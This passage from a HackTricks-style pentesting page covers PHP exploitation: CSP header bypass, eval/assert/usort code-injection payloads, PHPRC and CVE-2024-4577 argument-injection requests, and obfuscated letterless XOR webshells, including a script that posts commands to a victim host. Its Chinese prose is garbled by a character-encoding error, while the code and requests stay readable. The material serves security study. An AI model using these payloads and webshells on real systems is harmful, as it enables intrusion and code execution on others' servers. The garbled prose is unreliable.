<p>ä» <a href="https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&amp;s=19"><strong>è¿™ä¸ªæ¨ç‰¹çº¿ç¨‹</strong></a> ä½ å¯ä»¥çœ‹åˆ°ï¼Œå‘é€è¶…è¿‡ 1000 ä¸ª GET å‚æ•°æˆ– 1000 ä¸ª POST å‚æ•°æˆ– 20 ä¸ªæ–‡ä»¶æ—¶ï¼ŒPHP ä¸ä¼šåœ¨å“åº”ä¸­è®¾ç½®å¤´éƒ¨ã€‚</p>
<p>è¿™å…è®¸ç»•è¿‡ä¾‹å¦‚åœ¨ä»£ç ä¸­è®¾ç½®çš„ CSP å¤´éƒ¨ï¼š</p>
<pre><code class="language-php">&lt;?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
</code></pre>
<h4 id="åœ¨è®¾ç½®å¤´éƒ¨ä¹‹å‰å¡«å……ä¸»ä½“"><a class="header" href="#åœ¨è®¾ç½®å¤´éƒ¨ä¹‹å‰å¡«å……ä¸»ä½“">åœ¨è®¾ç½®å¤´éƒ¨ä¹‹å‰å¡«å……ä¸»ä½“</a></h4>
<p>å¦‚æœä¸€ä¸ª <strong>PHP é¡µé¢æ­£åœ¨æ‰“å°é”™è¯¯å¹¶å›æ˜¾ç”¨æˆ·æä¾›çš„ä¸€äº›è¾“å…¥</strong>ï¼Œç”¨æˆ·å¯ä»¥ä½¿ PHP æœåŠ¡å™¨æ‰“å°å‡ºä¸€äº› <strong>è¶³å¤Ÿé•¿çš„å†…å®¹</strong>ï¼Œä»¥ä¾¿åœ¨å°è¯• <strong>æ·»åŠ å¤´éƒ¨</strong> åˆ°å“åº”æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠ›å‡ºé”™è¯¯ã€‚<br />
åœ¨ä»¥ä¸‹åœºæ™¯ä¸­ï¼Œ<strong>æ”»å‡»è€…ä½¿æœåŠ¡å™¨æŠ›å‡ºäº†ä¸€äº›å¤§çš„é”™è¯¯</strong>ï¼Œæ­£å¦‚æ‚¨åœ¨å±å¹•ä¸Šçœ‹åˆ°çš„ï¼Œå½“ PHP å°è¯• <strong>ä¿®æ”¹å¤´éƒ¨ä¿¡æ¯æ—¶ï¼Œå®ƒæ— æ³•</strong>ï¼ˆä¾‹å¦‚ CSP å¤´éƒ¨æ²¡æœ‰å‘é€ç»™ç”¨æˆ·ï¼‰ï¼š</p>
<p><img src="../../../.gitbook/assets/image%20(1085).png" alt="" /></p>
<h2 id="php-å‡½æ•°ä¸­çš„-ssrf"><a class="header" href="#php-å‡½æ•°ä¸­çš„-ssrf">PHP å‡½æ•°ä¸­çš„ SSRF</a></h2>
<p>æŸ¥çœ‹é¡µé¢ï¼š</p>
<p>{% content-ref url="php-ssrf.md" %}
<a href="php-ssrf.html">php-ssrf.md</a>
{% endcontent-ref %}</p>
<h2 id="ä»£ç æ‰§è¡Œ"><a class="header" href="#ä»£ç æ‰§è¡Œ">ä»£ç æ‰§è¡Œ</a></h2>
<p><strong>system("ls");</strong><br />
&amp;#xNAN;<strong>`ls`;</strong><br />
<strong>shell_exec("ls");</strong></p>
<p><a href="php-useful-functions-disable_functions-open_basedir-bypass/">æŸ¥çœ‹æ›´å¤šæœ‰ç”¨çš„ PHP å‡½æ•°</a></p>
<h3 id="é€šè¿‡-preg_replace-è¿›è¡Œ-rce"><a class="header" href="#é€šè¿‡-preg_replace-è¿›è¡Œ-rce"><strong>é€šè¿‡</strong> <strong>preg_replace()</strong> <strong>è¿›è¡Œ RCE</strong></a></h3>
<pre><code class="language-php">preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
</code></pre>
<p>è¦åœ¨â€œreplaceâ€å‚æ•°ä¸­æ‰§è¡Œä»£ç ï¼Œè‡³å°‘éœ€è¦ä¸€ä¸ªåŒ¹é…é¡¹ã€‚<br />
æ­¤é€‰é¡¹åœ¨ PHP 5.5.0 ä¸­å·²è¢«<strong>å¼ƒç”¨</strong>ã€‚</p>
<h3 id="é€šè¿‡-eval-è¿›è¡Œ-rce"><a class="header" href="#é€šè¿‡-eval-è¿›è¡Œ-rce"><strong>é€šè¿‡ Eval() è¿›è¡Œ RCE</strong></a></h3>
<pre><code>'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
&lt;?php phpinfo(); ?&gt;
</code></pre>
<h3 id="é€šè¿‡-assert-å®ç°-rce"><a class="header" href="#é€šè¿‡-assert-å®ç°-rce"><strong>é€šè¿‡ Assert() å®ç° RCE</strong></a></h3>
<p>æ­¤å‡½æ•°åœ¨ php ä¸­å…è®¸æ‚¨ <strong>æ‰§è¡Œä»¥å­—ç¬¦ä¸²ç¼–å†™çš„ä»£ç </strong> ä»¥ <strong>è¿”å› true æˆ– false</strong>ï¼ˆå¹¶æ ¹æ®æ­¤æ”¹å˜æ‰§è¡Œï¼‰ã€‚é€šå¸¸ç”¨æˆ·å˜é‡ä¼šæ’å…¥åˆ°å­—ç¬¦ä¸²ä¸­é—´ã€‚ä¾‹å¦‚ï¼š<br />
<code>assert("strpos($_GET['page']),'..') === false")</code> --&gt; åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦è·å¾— <strong>RCE</strong>ï¼Œæ‚¨å¯ä»¥è¿™æ ·åšï¼š</p>
<pre><code>?page=a','NeVeR') === false and system('ls') and strpos('a
</code></pre>
<p>æ‚¨éœ€è¦<strong>ç ´å</strong>ä»£ç <strong>è¯­æ³•</strong>ï¼Œ<strong>æ·»åŠ </strong>æ‚¨çš„<strong>æœ‰æ•ˆè½½è·</strong>ï¼Œç„¶å<strong>å†æ¬¡ä¿®å¤</strong>å®ƒã€‚æ‚¨å¯ä»¥ä½¿ç”¨<strong>é€»è¾‘è¿ç®—</strong>ï¼Œä¾‹å¦‚â€œ<strong>and</strong>â€æˆ–â€œ%26%26â€æˆ–â€œ|â€ã€‚è¯·æ³¨æ„ï¼Œâ€œorâ€å’Œâ€œ||â€ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºå¦‚æœç¬¬ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·å°†ä¸ä¼šè¢«æ‰§è¡Œã€‚åŒæ ·ï¼Œâ€œ;â€ä¹Ÿä¸èµ·ä½œç”¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ä¸ä¼šè¢«æ‰§è¡Œã€‚</p>
<p><strong>å¦ä¸€ä¸ªé€‰é¡¹</strong>æ˜¯å°†å‘½ä»¤çš„æ‰§è¡Œæ·»åŠ åˆ°å­—ç¬¦ä¸²ä¸­ï¼š<code>'.highlight_file('.passwd').'</code></p>
<p><strong>å¦ä¸€ä¸ªé€‰é¡¹</strong>ï¼ˆå¦‚æœæ‚¨æœ‰å†…éƒ¨ä»£ç ï¼‰æ˜¯ä¿®æ”¹æŸä¸ªå˜é‡ä»¥æ”¹å˜æ‰§è¡Œï¼š<code>$file = "hola"</code></p>
<h3 id="é€šè¿‡-usort-è¿›è¡Œ-rce"><a class="header" href="#é€šè¿‡-usort-è¿›è¡Œ-rce"><strong>é€šè¿‡ usort() è¿›è¡Œ RCE</strong></a></h3>
<p>æ­¤å‡½æ•°ç”¨äºä½¿ç”¨ç‰¹å®šå‡½æ•°å¯¹é¡¹ç›®æ•°ç»„è¿›è¡Œæ’åºã€‚<br />
è¦æ»¥ç”¨æ­¤å‡½æ•°ï¼š</p>
<pre><code class="language-php">&lt;?php usort(VALUE, "cmp"); #Being cmp a valid function ?&gt;
VALUE: );phpinfo();#

&lt;?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?&gt;
</code></pre>
<pre><code class="language-php">&lt;?php
function foo($x,$y){
usort(VALUE, "cmp");
}?&gt;
VALUE: );}[PHP CODE];#

&lt;?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?&gt;
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <strong>//</strong> æ³¨é‡Šå…¶ä½™çš„ä»£ç ã€‚</p>
<p>è¦å‘ç°æ‚¨éœ€è¦å…³é—­çš„æ‹¬å·æ•°é‡ï¼š</p>
<ul>
<li><code>?order=id;}//</code>ï¼šæˆ‘ä»¬æ”¶åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼ˆ<code>Parse error: syntax error, unexpected ';'</code>ï¼‰ã€‚æˆ‘ä»¬å¯èƒ½ç¼ºå°‘ä¸€ä¸ªæˆ–å¤šä¸ªæ‹¬å·ã€‚</li>
<li><code>?order=id);}//</code>ï¼šæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ª <strong>è­¦å‘Š</strong>ã€‚è¿™ä¼¼ä¹æ˜¯æ­£ç¡®çš„ã€‚</li>
<li><code>?order=id));}//</code>ï¼šæˆ‘ä»¬æ”¶åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼ˆ<code>Parse error: syntax error, unexpected ')' i</code>ï¼‰ã€‚æˆ‘ä»¬å¯èƒ½æœ‰å¤ªå¤šçš„é—­åˆæ‹¬å·ã€‚</li>
</ul>
<h3 id="é€šè¿‡-httaccess-è¿›è¡Œ-rce"><a class="header" href="#é€šè¿‡-httaccess-è¿›è¡Œ-rce"><strong>é€šè¿‡ .httaccess è¿›è¡Œ RCE</strong></a></h3>
<p>å¦‚æœæ‚¨å¯ä»¥ <strong>ä¸Šä¼ </strong> ä¸€ä¸ª <strong>.htaccess</strong>ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥ <strong>é…ç½®</strong> å¤šä¸ªå†…å®¹ï¼Œç”šè‡³æ‰§è¡Œä»£ç ï¼ˆé…ç½®å…·æœ‰ .htaccess æ‰©å±•åçš„æ–‡ä»¶å¯ä»¥è¢« <strong>æ‰§è¡Œ</strong>ï¼‰ã€‚</p>
<p>ä¸åŒçš„ .htaccess shell å¯ä»¥åœ¨ <a href="https://github.com/wireghoul/htshells">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<h3 id="é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡Œ-rce"><a class="header" href="#é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡Œ-rce">é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡Œ RCE</a></h3>
<p>å¦‚æœæ‚¨å‘ç°ä¸€ä¸ªæ¼æ´ï¼Œå…è®¸æ‚¨ <strong>ä¿®æ”¹ PHP ä¸­çš„ç¯å¢ƒå˜é‡</strong>ï¼ˆè¿˜æœ‰å¦ä¸€ä¸ªæ¼æ´å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå°½ç®¡ç»è¿‡æ›´å¤šç ”ç©¶å¯èƒ½å¯ä»¥ç»•è¿‡ï¼‰ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºè·å¾— <strong>RCE</strong>ã€‚</p>
<ul>
<li><a href="../../../linux-hardening/privilege-escalation/#ld_preload-and-ld_library_path"><strong><code>LD_PRELOAD</code></strong></a>ï¼šæ­¤ç¯å¢ƒå˜é‡å…è®¸æ‚¨åœ¨æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶æ—¶åŠ è½½ä»»æ„åº“ï¼ˆå°½ç®¡åœ¨è¿™ç§æƒ…å†µä¸‹å¯èƒ½ä¸èµ·ä½œç”¨ï¼‰ã€‚</li>
<li><strong><code>PHPRC</code></strong>ï¼šæŒ‡ç¤º PHP <strong>åœ¨å“ªé‡ŒæŸ¥æ‰¾å…¶é…ç½®æ–‡ä»¶</strong>ï¼Œé€šå¸¸ç§°ä¸º <code>php.ini</code>ã€‚å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼Œåˆ™ä½¿ç”¨ <code>PHPRC</code> æŒ‡å‘å®ƒã€‚æ·»åŠ ä¸€ä¸ª <strong><code>auto_prepend_file</code></strong> æ¡ç›®ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªä¸Šä¼ çš„æ–‡ä»¶ã€‚è¿™ä¸ªç¬¬äºŒä¸ªæ–‡ä»¶åŒ…å«æ­£å¸¸çš„ <strong>PHP ä»£ç ï¼Œç„¶åç”± PHP è¿è¡Œæ—¶æ‰§è¡Œ</strong>ï¼Œåœ¨ä»»ä½•å…¶ä»–ä»£ç ä¹‹å‰ã€‚</li>
</ul>
<ol>
<li>ä¸Šä¼ ä¸€ä¸ªåŒ…å«æˆ‘ä»¬çš„ shellcode çš„ PHP æ–‡ä»¶</li>
<li>ä¸Šä¼ ç¬¬äºŒä¸ªæ–‡ä»¶ï¼ŒåŒ…å« <strong><code>auto_prepend_file</code></strong> æŒ‡ä»¤ï¼ŒæŒ‡ç¤º PHP é¢„å¤„ç†å™¨æ‰§è¡Œæˆ‘ä»¬åœ¨æ­¥éª¤ 1 ä¸­ä¸Šä¼ çš„æ–‡ä»¶</li>
<li>å°† <code>PHPRC</code> å˜é‡è®¾ç½®ä¸ºæˆ‘ä»¬åœ¨æ­¥éª¤ 2 ä¸­ä¸Šä¼ çš„æ–‡ä»¶ã€‚</li>
</ol>
<ul>
<li>è·å–æ›´å¤šå…³äºå¦‚ä½•æ‰§è¡Œæ­¤é“¾çš„ä¿¡æ¯ <a href="https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/"><strong>æ¥è‡ªåŸå§‹æŠ¥å‘Š</strong></a>ã€‚</li>
<li><strong>PHPRC</strong> - å¦ä¸€ä¸ªé€‰é¡¹</li>
<li>å¦‚æœæ‚¨ <strong>æ— æ³•ä¸Šä¼ æ–‡ä»¶</strong>ï¼Œæ‚¨å¯ä»¥åœ¨ FreeBSD ä¸­ä½¿ç”¨ "file" <code>/dev/fd/0</code>ï¼Œå®ƒåŒ…å« <strong><code>stdin</code></strong>ï¼Œå³å‘é€åˆ° <code>stdin</code> çš„è¯·æ±‚çš„ <strong>ä¸»ä½“</strong>ï¼š</li>
<li><code>curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'</code></li>
<li>æˆ–è€…è¦è·å¾— RCEï¼Œå¯ç”¨ <strong><code>allow_url_include</code></strong> å¹¶é¢„å…ˆæ·»åŠ ä¸€ä¸ªåŒ…å« <strong>base64 PHP ä»£ç </strong> çš„æ–‡ä»¶ï¼š</li>
<li><code>curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'</code></li>
<li>æŠ€æœ¯ <a href="https://vulncheck.com/blog/juniper-cve-2023-36845"><strong>æ¥è‡ªæ­¤æŠ¥å‘Š</strong></a>ã€‚</li>
</ul>
<h3 id="xampp-cgi-rce---cve-2024-4577"><a class="header" href="#xampp-cgi-rce---cve-2024-4577">XAMPP CGI RCE - CVE-2024-4577</a></h3>
<p>Web æœåŠ¡å™¨è§£æ HTTP è¯·æ±‚å¹¶å°†å…¶ä¼ é€’ç»™æ‰§è¡Œè¯·æ±‚çš„ PHP è„šæœ¬ï¼Œä¾‹å¦‚ <a href="http://host/cgi.php?foo=bar&amp;ref=labs.watchtowr.com"><code>http://host/cgi.php?foo=bar</code></a>ï¼Œä½œä¸º <code>php.exe cgi.php foo=bar</code>ï¼Œè¿™å…è®¸å‚æ•°æ³¨å…¥ã€‚è¿™å°†å…è®¸æ³¨å…¥ä»¥ä¸‹å‚æ•°ä»¥ä»ä¸»ä½“åŠ è½½ PHP ä»£ç ï¼š</p>
<pre><code class="language-jsx">-d allow_url_include=1 -d auto_prepend_file=php://input
</code></pre>
<p>æ­¤å¤–ï¼Œç”±äº PHP åæ¥çš„è§„èŒƒåŒ–ï¼Œå¯ä»¥ä½¿ç”¨ 0xAD å­—ç¬¦æ³¨å…¥ "-" å‚æ•°ã€‚æ£€æŸ¥æ¥è‡ª <a href="https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/"><strong>è¿™ç¯‡æ–‡ç« </strong></a> çš„æ¼æ´ç¤ºä¾‹ï¼š</p>
<pre><code class="language-jsx">POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

&lt;?php
phpinfo();
?&gt;

</code></pre>
<h2 id="php-sanitization-bypass--brain-fuck"><a class="header" href="#php-sanitization-bypass--brain-fuck">PHP Sanitization bypass &amp; Brain Fuck</a></h2>
<p><a href="https://blog.redteam-pentesting.de/2024/moodle-rce/"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­</strong></a> å¯ä»¥æ‰¾åˆ°ç”Ÿæˆè„‘æ®‹ PHP ä»£ç çš„å¥½ä¸»æ„ï¼Œå…è®¸çš„å­—ç¬¦éå¸¸å°‘ã€‚<br />
æ­¤å¤–ï¼Œè¿˜æå‡ºäº†ä¸€ç§æœ‰è¶£çš„æ–¹æ³•æ¥æ‰§è¡Œå‡½æ•°ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿç»•è¿‡å¤šä¸ªæ£€æŸ¥ï¼š</p>
<pre><code class="language-php">(1)-&gt;{system($_GET[chr(97)])}
</code></pre>
<h2 id="php-é™æ€åˆ†æ"><a class="header" href="#php-é™æ€åˆ†æ">PHP é™æ€åˆ†æ</a></h2>
<p>æŸ¥çœ‹æ‚¨æ˜¯å¦å¯ä»¥åœ¨å¯¹è¿™äº›å‡½æ•°çš„è°ƒç”¨ä¸­æ’å…¥ä»£ç ï¼ˆæ¥è‡ª <a href="https://www.youtube.com/watch?v=SyWUsN0yHKI&amp;feature=youtu.be">è¿™é‡Œ</a>):</p>
<pre><code class="language-php">exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
</code></pre>
<p>å¦‚æœæ‚¨æ­£åœ¨è°ƒè¯• PHP åº”ç”¨ç¨‹åºï¼Œå¯ä»¥åœ¨ <code>/etc/php5/apache2/php.ini</code> ä¸­å…¨å±€å¯ç”¨é”™è¯¯æ‰“å°ï¼Œæ·»åŠ  <code>display_errors = On</code> å¹¶é‡å¯ apacheï¼š <code>sudo systemctl restart apache2</code></p>
<h3 id="åæ··æ·†-php-ä»£ç "><a class="header" href="#åæ··æ·†-php-ä»£ç ">åæ··æ·† PHP ä»£ç </a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong>web</strong><a href="http://www.unphp.net"> <strong>www.unphp.net</strong></a> <strong>æ¥åæ··æ·† php ä»£ç ã€‚</strong></p>
<h2 id="php-åŒ…è£…å™¨å’Œåè®®"><a class="header" href="#php-åŒ…è£…å™¨å’Œåè®®">PHP åŒ…è£…å™¨å’Œåè®®</a></h2>
<p>PHP åŒ…è£…å™¨å’Œåè®®å¯èƒ½å…è®¸æ‚¨ <strong>ç»•è¿‡ç³»ç»Ÿä¸­çš„è¯»å†™ä¿æŠ¤</strong> å¹¶å±å®³ç³»ç»Ÿã€‚æœ‰å…³ <a href="../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols"><strong>æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤é¡µé¢</strong></a>ã€‚</p>
<h2 id="xdebug-æœªç»èº«ä»½éªŒè¯çš„-rce"><a class="header" href="#xdebug-æœªç»èº«ä»½éªŒè¯çš„-rce">Xdebug æœªç»èº«ä»½éªŒè¯çš„ RCE</a></h2>
<p>å¦‚æœæ‚¨åœ¨ <code>phpconfig()</code> è¾“å‡ºä¸­çœ‹åˆ° <strong>Xdebug</strong> å·² <strong>å¯ç”¨</strong>ï¼Œæ‚¨åº”è¯¥å°è¯•é€šè¿‡ <a href="https://github.com/nqxcode/xdebug-exploit">https://github.com/nqxcode/xdebug-exploit</a> è·å– RCEã€‚</p>
<h2 id="å˜é‡å˜é‡"><a class="header" href="#å˜é‡å˜é‡">å˜é‡å˜é‡</a></h2>
<pre><code class="language-php">$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
</code></pre>
<h2 id="rce-åˆ©ç”¨æ–°çš„-_geta_getb"><a class="header" href="#rce-åˆ©ç”¨æ–°çš„-_geta_getb">RCE åˆ©ç”¨æ–°çš„ $_GET["a"]($_GET["b")</a></h2>
<p>å¦‚æœåœ¨ä¸€ä¸ªé¡µé¢ä¸­ä½ å¯ä»¥<strong>åˆ›å»ºä¸€ä¸ªä»»æ„ç±»çš„æ–°å¯¹è±¡</strong>ï¼Œä½ å¯èƒ½èƒ½å¤Ÿè·å¾— RCEï¼ŒæŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£å¦‚ä½•ï¼š</p>
<p>{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
<a href="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.html">php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md</a>
{% endcontent-ref %}</p>
<h2 id="æ— å­—æ¯æ‰§è¡Œ-php"><a class="header" href="#æ— å­—æ¯æ‰§è¡Œ-php">æ— å­—æ¯æ‰§è¡Œ PHP</a></h2>
<p><a href="https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/">https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/</a></p>
<h3 id="ä½¿ç”¨å…«è¿›åˆ¶"><a class="header" href="#ä½¿ç”¨å…«è¿›åˆ¶">ä½¿ç”¨å…«è¿›åˆ¶</a></h3>
<pre><code class="language-php">$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
</code></pre>
<h3 id="å¼‚æˆ–"><a class="header" href="#å¼‚æˆ–"><strong>å¼‚æˆ–</strong></a></h3>
<pre><code class="language-php">$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
</code></pre>
<h3 id="xor-ç®€æ˜“-shell-ä»£ç "><a class="header" href="#xor-ç®€æ˜“-shell-ä»£ç ">XOR ç®€æ˜“ Shell ä»£ç </a></h3>
<p>æ ¹æ® <a href="https://mgp25.com/ctf/Web-challenge/"><strong>è¿™ç¯‡æ–‡ç« </strong> </a>ä»¥ä¸‹æ–¹å¼å¯ä»¥ç”Ÿæˆä¸€ä¸ªç®€æ˜“çš„ Shell ä»£ç ï¼š</p>
<pre><code class="language-php">$_="`{{{"^"?&lt;&gt;/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?&lt;&gt;/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
</code></pre>
<p>æ‰€ä»¥ï¼Œå¦‚æœä½ å¯ä»¥<strong>åœ¨æ²¡æœ‰æ•°å­—å’Œå­—æ¯çš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ PHP</strong>ï¼Œä½ å¯ä»¥å‘é€å¦‚ä¸‹è¯·æ±‚ï¼Œåˆ©ç”¨è¯¥æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œä»»æ„ PHPï¼š</p>
<pre><code>POST: /action.php?_=system&amp;__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?&lt;&gt;/";${$_}[_](${$_}[__]);
</code></pre>
<p>å¯¹äºæ›´æ·±å…¥çš„è§£é‡Šï¼Œè¯·æŸ¥çœ‹ <a href="https://ctf-wiki.org/web/php/php/#preg_match">https://ctf-wiki.org/web/php/php/#preg_match</a></p>
<h3 id="xor-shellcode-åœ¨-eval-å†…éƒ¨"><a class="header" href="#xor-shellcode-åœ¨-eval-å†…éƒ¨">XOR Shellcode (åœ¨ eval å†…éƒ¨)</a></h3>
<pre><code class="language-bash">#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
</code></pre>
<pre><code class="language-php">lt;&gt;/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
</code></pre>
<pre><code class="language-php">lt;&gt;/'^'{{{{'; --&gt; _GET` `${$_}[_](${$_}[__]); --&gt; $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&amp;__=$CMD" "input=$CODE"
</code></pre>
<h3 id="ç±»ä¼¼perl"><a class="header" href="#ç±»ä¼¼perl">ç±»ä¼¼Perl</a></h3>
<pre><code class="language-php">&lt;?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
</code></pre>
<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦çœ‹å¾…æ‚¨çš„ç½‘ç»œåº”ç”¨ã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>å‘ç°å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬20å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼Œæ‰¾åˆ°è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–åˆ©ç”¨æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
